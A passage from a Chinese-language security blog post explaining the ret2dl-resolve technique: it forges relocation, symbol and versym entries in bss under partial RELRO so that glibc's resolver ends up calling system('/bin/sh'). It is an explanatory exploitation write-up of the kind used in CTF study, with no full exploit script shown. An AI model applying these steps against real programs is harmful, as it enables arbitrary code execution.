_dl_lookup_symbol_x(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">//link_map中保存着目标模块的基地址,sym中保存着符号相对目标模块的偏移量,加起来得到符号的虚拟地址</span></span><br><span class="line">vaddr = other_linkmap.laddr + sym.st_info</span><br></pre></td></tr></table></figure>
<h3 id="no_relro">no_relro</h3>
<p>strtab节通常和text节加载到同一个只读段,因此在strtab上篡改函数名字符串是不可能的</p>
<p>在no_relro保护下,dynamic节可写, 可以篡改dynamic.strtab指针指向fake
strtab</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193931068.png"
alt="image-20240819193931068" />
<figcaption aria-hidden="true">image-20240819193931068</figcaption>
</figure>
<h3 id="partial_relro">partial_relro</h3>
<p>在no_relro保护中，可以通过篡改dynamic节中的指针指向假的strtab伪造假的函数名</p>
<p>但是partial_relro保护使得dynamic节只读，无法篡改其中的字符串表指针</p>
<h4 id="stage1">stage1</h4>
<p>由于我们需要构造“/bin/sh”这种字符串,要么调用read函数往内存里写,要么溢出时写进去</p>
<p>前者需要再构造read调用的rop链,并且还得给字符串找地方,找一个我们知道地址并且可写的地方,比如bss段</p>
<p>后者由于栈地址不知道在哪,需要做一个栈迁移,首先把栈搬到bss段上</p>
<p>后者更加方便,采取后者</p>
<h4 id="stage2">stage2</h4>
<p>在本阶段我们构造rop链条,手动调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve@.GOT.PLT[0](</span><br><span class="line">	link_map=.GOT.PLT[1]</span><br><span class="line">	reloc_arg=0x20</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><strong>也就是再解析调用一下write函数,目的是验证一下,已经解析过的符号,使用rop方法能够再次触发解析过程,并且该过程是正确的</strong></p>
<h4 id="stage3">stage3</h4>
<p>在本阶段我们在bss段伪造一个重定位表项,
但是该表项的内容指向正确的symtab表</p>
<p>为了使用这个假重定位表项,我们将dl_runtime_resolve的参数reloc_arg改成,该bss段假表项与真的重定位表的偏移量</p>
<p>该偏移量显然会大的离谱,远远超出重定位表的范围,因为bss和relplt段相距甚远</p>
<p><strong>此举目的是验证即使传递的reloc_arg超过重定位表范围,也没有任何安全检查阻拦,使得我们能够正确解析到符号</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819195308717.png"
alt="image-20240819195308717" />
<figcaption aria-hidden="true">image-20240819195308717</figcaption>
</figure>
<h4 id="stage4">stage4</h4>
<p>在本阶段我们既要构造假的重定位表项,又要构造假的符号表项</p>
<p>此时假重定位表项不再指向正确的符号,而是指向我们构造的符号</p>
<p>但是这个假符号依然索引正确的符号名称</p>
<p>显然此时reloc_arg索引重定位表的偏移量远超重定位表范围,并且假重定位项索引假符号的偏移量也远超了符号表范围</p>
<p><strong>此举目的是验证,即使符号表的索引越界,也没有任何安全检查阻拦,使得我们能够正确解析到符号</strong></p>
<figure>
<img
src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20240819193641215.png"
alt="image-20240819193641215" />
<figcaption aria-hidden="true">image-20240819193641215</figcaption>
</figure>
<p>想法很好,然而在dl_runtime_resolve中,r_info不只会被用来索引符号表,还会索引versym符号版本表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    	version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819213749275.png"
alt="image-20240819213749275" />
<figcaption aria-hidden="true">image-20240819213749275</figcaption>
</figure>
<p>我们依据假符号与符号表的偏移量,计算出r_info,这保证了假重定位项可以索引假符号</p>
<p>但是不能保证r_info索引versym表的什么地方</p>
<p>实际运行时ndx=0x442c</p>
<p>&amp;l-&gt;l_versions=0xf7f5a710</p>
<p>然后versions表里面一项是0x10字节</p>
<p>所以version = &amp;l-&gt;l_versions[ndx]=0xf7f9e9d4;</p>
<p>下一条指令就要解引用了version-&gt;hash</p>
<p>然而0xf7f9e9d4上并没有在任何一个内存映射区,是一个非法地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7f95000</span> <span class="number">0xf7f96000</span> rw-p     <span class="number">1000</span>  <span class="number">32000</span> /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xffb01000</span> <span class="number">0xfff59000</span> rw-p   <span class="number">458000</span>      <span class="number">0</span> [<span class="built_in">stack</span>]</span><br></pre></td></tr></table></figure>
<p>因此对非法地址解引用就段错误了</p>
<p>怎么修复这个过程呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">           version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">           <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">               version = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>假重定位项的r_info既索引假符号表项,又索引假versym表项</p>
<p>如果能控制假versym表项为空,则ndx就是0,此时l_versions[ndx]=l_versions[0]就一定是合法的了</p>
<p>也就是说,我们可以微操控制一下r_info的值</p>
<p>如何控制呢?</p>
<p>原本r_info=0x26807,其中的索引值是0x268</p>
<p>vernum基地址是0x80482d8</p>
<p>vernum[ELFW(R_SYM)(reloc-&gt;r_info)]这个假表项,在0x80482d8+0x268*2=0x080487A8上,使用ida观察这里是.eh_frame段</p>
<p>往下翻找一个全零的假表项位置比如0x080487C2就很好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:080487A8 2C                                            db  2Ch ; ,</span><br><span class="line">	...</span><br><span class="line">.eh_frame:080487C2 00                                            db    0</span><br><span class="line">.eh_frame:080487C3 00                                            db    0</span><br></pre></td></tr></table></figure>
<p>0x080487C2=0x80482d8+index*2</p>
<p>那么index=0x275</p>
<p>那么r_info就得是0x27507</p>
<p>注意如果只修改假的重定位项,令其r_info=0x27507,这样就又不能正确索引到假的符号表项了</p>
<p>按下葫芦浮起瓢,因此还需要修正bss段伪造的假符号位置,在原位置基础上加一个<code>(0x275-0x268)*16</code>即可</p>
<p>乘16的原因是,符号表项一个占用16字节</p>
<h4 id="stage5">stage5</h4>
<p>在本阶段,伪造假符号名字符串,并令假符号的st_name指向它,目的是证明即使st_name远超strtab范围,依然没有任何安全检查阻拦</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820103319870.png"
alt="image-20240820103319870" />
<figcaption aria-hidden="true">image-20240820103319870</figcaption>
</figure>
<h4 id="stage6">stage6</h4>
<p>把stage5中的假符号名字符串改成“system”,并把write的参数(1,“/bin/sh”,“7”)改成system的参数(“/bin/sh”)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820111602402.png"
alt="image-20240820111602402" />
<figcaption aria-hidden="true">image-20240820111602402</figcaption>
</figure>
<h2 id="在目标模块中阴暗地爬行">在目标模块中阴暗地爬行</h2>
<p>分析了<code>_dl_fixup</code>的源码之后,已经能够理解ret2dl-resolve的原理了</p>
<p>下面的问题是,<code>_dl_fixup</code>中调用的<code>_dl_lookup_symbol_x</code>函数,是如何查找符号的呢?</p>
<p>可想而知的是,<code>glibc</code>中的符号成百上千,如果纯纯使用符号名字符串,进行模式匹配,那可真是慢了去了</p>
<p>到底怎么在目标模块中解析符号的呢?</p>
<p><a
target="_blank" rel="noopener" href="https://blogs.oracle.com/solaris/post/gnu-hash-elf-sections">GNU
Hash ELF Sections (oracle.com)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-223668.htm">翻译]GNU Hash ELF
Sections-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h2 id="符号解析中的哈希算法">符号解析中的哈希算法</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve</span><br><span class="line">	_dl_fixup</span><br><span class="line">		_dl_lookup_symbol_x</span><br><span class="line">			do_lookup_x</span><br><span class="line">				do_lookup_unique</span><br><span class="line">					enter_unique_sym</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="page-number current">2</span><a class="page-number" href="/impossible/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/10/">10</a><a class="extend next" rel="next" href="/impossible/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
